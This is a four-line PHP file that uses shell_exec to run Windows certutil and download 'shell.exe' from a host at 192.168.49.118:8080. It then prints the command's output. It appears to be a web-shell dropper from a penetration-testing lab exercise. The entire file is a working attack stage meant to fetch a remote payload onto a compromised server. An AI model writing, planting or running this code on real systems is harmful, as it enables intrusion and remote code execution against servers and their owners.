<?php
$output = shell_exec('certutil -f -split -urlcache http://192.168.49.118:8080/shell.exe');
echo "<pre>$output</pre>";
?>

